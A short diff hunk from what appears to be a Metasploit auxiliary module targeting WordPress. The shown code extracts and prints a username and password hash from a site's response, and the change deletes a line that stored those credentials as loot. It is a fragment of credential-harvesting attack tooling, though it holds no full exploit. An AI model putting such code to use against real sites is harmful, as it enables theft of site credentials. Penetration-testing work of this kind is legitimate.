@@ -77,7 +77,6 @@ class MetasploitModule < Msf::Auxiliary
     if match_data
       username, password_hash = match_data.captures
       print_good("Extracted credentials: #{username}:#{password_hash}")
-      store_loot('wordpress.credentials', 'text/plain', rhost, "#{username}:#{password_hash}", 'wp_credentials.txt', 'Extracted WordPress credentials')
     else
       print_warning('Could not extract username and password hash. Try enabling SHOW_FULL_RESPONSE.')
       print_status("Full Response (HTML):\n#{html_content}") if datastore['SHOW_FULL_RESPONSE']
